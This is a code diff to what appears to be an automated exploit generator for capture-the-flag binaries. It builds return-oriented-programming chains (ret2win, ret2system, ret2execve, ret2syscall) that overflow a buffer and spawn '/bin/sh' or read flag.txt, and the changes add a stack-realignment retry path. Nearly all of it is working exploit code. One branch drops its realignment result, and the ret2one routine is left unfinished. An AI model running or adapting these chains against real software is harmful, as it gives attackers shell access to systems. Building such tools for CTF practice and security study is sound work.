@@ -20,42 +20,37 @@ class ROP:
         self.angr_rop.find_gadgets_single_threaded()
 
     def write_binsh_to_mem(self):
+        self.analysis.hbsh = True
         return self.angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
-
-    def ropwrite(self, dumb=False):
-        chain = b'A'*self.offset
-        chain += self.write_binsh_to_mem()
-        chain += self.fill_reg("rdi", self.get_writeable_mem())
-        if dumb:
-            chain += self.realign()
-        chain += p64(self.analysis.elf.sym['system'])
-        self.put_binsh=True
-        self.analysis.hbsh=True
-        return chain
     
-
-
+    # TODO: genralize to account for syscall or execve
+    #def ropwrite(self, dumb=False):
+    #    chain = b'A'*self.offset
+    #    chain += self.write_binsh_to_mem()
+    #    chain += self.fill_reg("rdi", self.get_writeable_mem())
+    #    if dumb:
+    #        chain += self.realign()
+    #    chain += p64(self.analysis.elf.sym['system'])
+    #    return chain
     
-
-    def build_exploit(self):
+    def build_exploit(self, failed=False):
         payload = None
         if self.analysis.has_win():
             if self.analysis.win_has_args():
-                payload = self.ret2win_with_args()
+                payload = self.ret2win_with_args(failed)
             else:
-                payload = self.ret2win()
+                payload = self.ret2win(failed)
         elif self.analysis.has_execve():
-            payload = self.ret2execve()
+            payload = self.ret2execve(failed)
         elif self.analysis.has_system():
-            payload = self.ret2system()
+            payload = self.ret2system(failed)
         elif self.analysis.has_syscall():
-            payload = self.ret2syscall()
+            payload = self.ret2syscall(failed)
         elif self.analysis.has_leak_string():
-            payload = self.ret2one()
+            payload = self.ret2one(failed)
         else:
             print("[!] Exploit not found!")
-        #payload = self.ropwrite()
-
+        #print(len(self.ropwrite()))
         return payload
     
     def set_offset(self):
@@ -70,57 +65,70 @@ class ROP:
         except PwnlibException as e:
             return Get2overflow(self.filename).buf()
 
-    def ret2win(self):
+    def ret2win(self, failed):
         payload = cyclic(self.offset)
+        if failed:
+            payload += self.realign()
         payload += p64(self.e.sym["win"])
         
         return payload
     
-    def ret2win_with_args(self):
+    def ret2win_with_args(self, failed):
         #TODO: Instead of passing address to win, return address to system or execve inside of win to avoid argument
         payload = cyclic(self.offset)
         payload += self.satisfy_win()
-        payload += self.realign()
+        if failed:
+            payload += self.realign()
         payload += p64(self.e.sym['win'])
 
         return payload
 
-    def ret2execve(self):
+    def ret2execve(self, failed):
         payload = cyclic(self.offset)
         payload += self.fill_reg("rdi", self.analysis.get_binsh())
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
+        if failed:
+            payload += self.realign()
         payload += p64(self.e.sym["execve"])
 
         return payload
 
-    def ret2syscall(self):
+    def ret2syscall(self, failed):
         payload = cyclic(self.offset)
         payload += self.fill_reg("rax", 59)
         payload += self.fill_reg("rdi", self.analysis.get_binsh())
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
+        if failed:
+            self.realign()
         payload += p64(self.get_syscall())
         
         return payload
     
-    def ret2system(self):
+    def ret2system(self, failed):
         payload = cyclic(self.offset)
         if self.analysis.has_catflagtxt():
             payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
         elif self.analysis.has_binsh():
             payload += self.fill_reg("rdi", self.analysis.get_binsh())
+        else:
+            payload += self.write_binsh_to_mem()
+            payload += self.fill_reg("rdi", self.get_writeable_mem())
+            
         payload += self.fill_reg("rsi", 0)
+        if failed:
+            payload += self.realign()
         payload += p64(self.e.sym['system'])
-
+        print(len(payload))
         return payload
 
-    def ret2one(self):
+    def ret2one(self, failed):
         payload = cyclic(self.offset)
         p = process(self.filename)
         p.recvuntil(b": ")
         leak = p.recvline().decode('utf-8').strip()
-        print(self.one_gadget())
+        
         return payload
 
     def supporting_functions_here(self): # ---------------------------------------------
